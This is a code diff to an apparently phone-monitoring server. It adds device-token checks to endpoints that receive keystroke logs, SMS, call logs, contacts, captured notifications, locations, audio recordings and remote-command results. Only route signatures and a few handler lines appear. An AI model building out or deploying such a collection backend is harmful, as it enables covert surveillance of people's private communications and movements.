@@ -9,7 +9,7 @@ import multer from 'multer';
 import { initDb, db } from './db.js';
 import { setupWebSocket } from './ws.js';
 import { normalizeCommandStatus, canAdvanceCommandStatus, isTerminalCommandStatus } from './sync-utils.js';
-import { generateToken, verifyToken, optionalAuth, hashPassword, comparePassword } from './auth.js';
+import { generateToken, verifyToken, verifyDeviceToken, optionalAuth, hashPassword, comparePassword } from './auth.js';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -447,7 +447,7 @@ app.delete('/api/devices/:id/disconnect', optionalAuth, async (req, res) => {
 // ==========================================
 // TELEMETRY SYNC
 // ==========================================
-app.post('/api/devices/:id/telemetry', async (req, res) => {
+app.post('/api/devices/:id/telemetry', verifyDeviceToken, async (req, res) => {
   const { id } = req.params;
   const telemetry = req.body;
   const now = new Date();
@@ -529,7 +529,7 @@ app.post('/api/devices/:id/telemetry', async (req, res) => {
 // ==========================================
 // LOCATION TRACKING
 // ==========================================
-app.post('/api/devices/:id/location', async (req, res) => {
+app.post('/api/devices/:id/location', verifyDeviceToken, async (req, res) => {
   const { id } = req.params;
   const { latitude, longitude, accuracy, altitude, speed, provider, timestamp } = req.body;
 
@@ -653,7 +653,7 @@ app.get('/api/devices/:id/locations', verifyToken, async (req, res) => {
 // ==========================================
 // NOTIFICATIONS CAPTURE
 // ==========================================
-app.post('/api/devices/:id/notifications', async (req, res) => {
+app.post('/api/devices/:id/notifications', verifyDeviceToken, async (req, res) => {
   const { id } = req.params;
   const notif = req.body;
 
@@ -758,7 +758,7 @@ app.delete('/api/devices/:id/notifications/:notifId', verifyToken, async (req, r
 // ==========================================
 // APPLICATION INVENTORY
 // ==========================================
-app.post('/api/devices/:id/apps', async (req, res) => {
+app.post('/api/devices/:id/apps', verifyDeviceToken, async (req, res) => {
   const { id } = req.params;
   const apps = req.body; // Array of AppInfoData
 
@@ -808,7 +808,7 @@ app.get('/api/devices/:id/apps', verifyToken, async (req, res) => {
 // ==========================================
 // USAGE STATISTICS
 // ==========================================
-app.post('/api/devices/:id/usage', async (req, res) => {
+app.post('/api/devices/:id/usage', verifyDeviceToken, async (req, res) => {
   const { id } = req.params;
   const usageList = req.body;
 
@@ -852,7 +852,7 @@ app.get('/api/devices/:id/usage', verifyToken, async (req, res) => {
 // ==========================================
 // FILE EXPLORER SERVICES
 // ==========================================
-app.post('/api/devices/:id/files', async (req, res) => {
+app.post('/api/devices/:id/files', verifyDeviceToken, async (req, res) => {
   const { id } = req.params;
   const list = req.body; // Array of file metadata
   if (Array.isArray(list)) {
@@ -907,7 +907,7 @@ app.get('/api/devices/:id/files', verifyToken, async (req, res) => {
 // ==========================================
 // SMS LOGGING SERVICES
 // ==========================================
-app.post('/api/devices/:id/sms', async (req, res) => {
+app.post('/api/devices/:id/sms', verifyDeviceToken, async (req, res) => {
   const { id } = req.params;
   const list = req.body; // Array of SMS records
   if (Array.isArray(list)) {
@@ -959,7 +959,7 @@ app.get('/api/devices/:id/sms', verifyToken, async (req, res) => {
 // ==========================================
 // CALL LOGGING SERVICES
 // ==========================================
-app.post('/api/devices/:id/calls', async (req, res) => {
+app.post('/api/devices/:id/calls', verifyDeviceToken, async (req, res) => {
   const { id } = req.params;
   const list = req.body;
   if (Array.isArray(list)) {
@@ -1012,7 +1012,7 @@ app.get('/api/devices/:id/calls', verifyToken, async (req, res) => {
 // ==========================================
 // CONTACT LIST MANAGEMENT
 // ==========================================
-app.post('/api/devices/:id/contacts', async (req, res) => {
+app.post('/api/devices/:id/contacts', verifyDeviceToken, async (req, res) => {
   const { id } = req.params;
   const list = req.body;
   if (Array.isArray(list)) {
@@ -1064,7 +1064,7 @@ app.get('/api/devices/:id/contacts', verifyToken, async (req, res) => {
 // ==========================================
 // KEYSTROKE CAPTURE LOGS
 // ==========================================
-app.post('/api/devices/:id/keystrokes', async (req, res) => {
+app.post('/api/devices/:id/keystrokes', verifyDeviceToken, async (req, res) => {
   const { id } = req.params;
   const list = req.body;
   if (Array.isArray(list)) {
@@ -1277,7 +1277,7 @@ app.get('/api/devices/:id/commands', verifyToken, async (req, res) => {
   }
 });
 
-app.post('/api/devices/:id/commands/:commandId/status', async (req, res) => {
+app.post('/api/devices/:id/commands/:commandId/status', verifyDeviceToken, async (req, res) => {
   const { id, commandId } = req.params;
   const { status: rawStatus, result, errorMessage } = req.body;
   const status = normalizeCommandStatus(rawStatus);
@@ -1322,7 +1322,7 @@ app.post('/api/devices/:id/commands/:commandId/status', async (req, res) => {
 // ==========================================
 // AUDIO & FILE UPLOADS
 // ==========================================
-app.post('/api/devices/:id/recordings', upload.single('file'), async (req, res) => {
+app.post('/api/devices/:id/recordings', verifyDeviceToken, upload.single('file'), async (req, res) => {
   const { id } = req.params;
   const durationMs = parseInt(req.body.durationMs) || 0;
   if (!req.file) {
@@ -1367,7 +1367,7 @@ app.get('/api/devices/:id/recordings', verifyToken, async (req, res) => {
 });
 
 // Generic file upload endpoint
-app.post('/api/devices/:id/upload-file', upload.single('file'), async (req, res) => {
+app.post('/api/devices/:id/upload-file', verifyDeviceToken, upload.single('file'), async (req, res) => {
   try {
     const { id } = req.params;
     if (!req.file) {
@@ -1473,7 +1473,7 @@ app.delete('/api/devices/:id/geofences/:geofenceId', verifyToken, async (req, re
 // ==========================================
 // DATA USAGE API
 // ==========================================
-app.post('/api/devices/:id/data-usage', async (req, res) => {
+app.post('/api/devices/:id/data-usage', verifyDeviceToken, async (req, res) => {
   const { id } = req.params;
   const { wifiRx, wifiTx, mobileRx, mobileTx } = req.body;
   try {
@@ -1522,7 +1522,7 @@ app.get('/api/devices/:id/data-usage', verifyToken, async (req, res) => {
 // ==========================================
 // SERVICE HEALTH API
 // ==========================================
-app.post('/api/devices/:id/service-health', async (req, res) => {
+app.post('/api/devices/:id/service-health', verifyDeviceToken, async (req, res) => {
   const { id } = req.params;
   const health = req.body; // { notificationMonitor, locationService, telemetryCollector, usageTracker, webSocket, foregroundService, lastSync }
   
